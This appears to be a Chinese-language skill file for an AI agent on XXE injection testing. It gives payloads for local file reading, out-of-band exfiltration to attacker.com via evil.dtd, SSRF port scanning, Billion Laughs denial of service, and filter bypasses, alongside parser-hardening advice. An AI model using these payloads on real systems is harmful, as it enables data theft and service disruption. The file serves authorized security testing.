---
name: xxe-testing
description: XXE XML外部实体注入测试的专业技能和方法论
version: 1.0.0
---

# XXE XML外部实体注入测试

## 概述

XXE（XML External Entity）注入是一种利用XML解析器处理外部实体的漏洞。本技能提供XXE漏洞的检测、利用和防护方法。

## 漏洞原理

XML解析器在处理外部实体时，可能读取本地文件、进行SSRF攻击或导致拒绝服务。常见于：
- XML文档解析
- SOAP服务
- Office文档（.docx, .xlsx等）
- SVG图片
- PDF文件

## 测试方法

### 1. 识别XML输入点

- 文件上传功能
- API接口接受XML数据
- SOAP请求
- Office文档处理
- 数据导入功能

### 2. 基础XXE检测

**测试外部实体：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**测试网络请求（SSRF）：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/">
]>
<foo>&xxe;</foo>
```

### 3. 盲XXE检测

**当响应不直接显示内容时：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/?file=/etc/passwd">
]>
<foo>&xxe;</foo>
```

**使用参数实体：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

**evil.dtd内容：**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
%eval;
%exfil;
```

## 利用技术

### 文件读取

**读取本地文件：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Windows路径：**
```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
```

### SSRF攻击

**内网探测：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<foo>&xxe;</foo>
```

**端口扫描：**
```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:22">
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379">
```

### 拒绝服务

**Billion Laughs攻击：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<foo>&lol9;</foo>
```

### Office文档XXE

**docx文件结构：**
```
word/document.xml - 包含文档内容
word/_rels/document.xml.rels - 包含外部引用
```

**修改document.xml.rels：**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships>
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="file:///etc/passwd" TargetMode="External"/>
</Relationships>
```

## 绕过技术

### 不同协议

**PHP：**
```xml
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
```

**Java：**
```xml
<!ENTITY xxe SYSTEM "jar:file:///path/to/file.zip!/file.txt">
```

**编码绕过：**
```xml
<!ENTITY xxe SYSTEM "file:///%65%74%63/%70%61%73%73%77%64">
```

### 参数实体

**利用参数实体绕过某些限制：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]>
<foo>test</foo>
```

## 工具使用

### XXEinjector

```bash
# 基础使用
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml

# 文件读取
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml --oob=http://attacker.com --path=/etc/passwd
```

### Burp Suite

1. 拦截包含XML的请求
2. 发送到Repeater
3. 修改XML内容，添加外部实体
4. 观察响应或外带数据

## 验证和报告

### 验证步骤

1. 确认XML解析器处理外部实体
2. 验证文件读取或SSRF是否成功
3. 评估影响范围（敏感文件、内网访问等）
4. 记录完整的POC

### 报告要点

- 漏洞位置和XML输入点
- 可读取的文件或可访问的内网资源
- 完整的利用步骤和PoC
- 修复建议（禁用外部实体、使用白名单等）

## 防护措施

### 推荐方案

1. **禁用外部实体**
   ```java
   // Java
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
   dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```

2. **使用白名单验证**
   - 验证XML结构
   - 限制允许的实体

3. **使用安全的解析器**
   - 使用不处理DTD的解析器
   - 使用JSON替代XML

## 注意事项

- 仅在授权测试环境中进行
- 避免读取敏感文件造成数据泄露
- 注意不同语言和库的XXE处理差异
- 测试Office文档时注意文件格式